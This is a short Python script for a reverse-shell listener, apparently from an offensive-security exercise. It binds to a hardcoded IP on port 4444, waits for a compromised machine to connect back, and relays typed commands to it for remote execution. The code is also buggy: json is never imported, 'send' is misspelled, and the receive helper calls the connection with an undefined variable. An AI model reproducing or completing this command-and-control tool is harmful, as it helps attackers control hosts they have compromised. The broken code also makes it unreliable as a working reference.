#!/usr/bin/env python

import socket

class Listener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
        listener.bind((ip,port))
        listener.listen(0)
        print("[+] Waiting for incoming conn")
        self.connection, address = listener.accept()
        print(" Got a connection from" + str(address))
        
    def execute_remotely(self,command):
        self.connection.send(command)
        return self.connection.recv(1024)
        
    def relible_send(self , data):
        json_data = json.dumps(data)
        self.connection.sned(json_data)
    
    def relible_recieve(self):
        json_data = self.connection(command)
        return self.connection.recv(1024)
        
    def run(self):
        while True:
            command = input(">> ")
            result = self.execute_remotely(command)
            print(result)

my_listener = Listener("9.246.94.31" , 4444)
my_listener.run()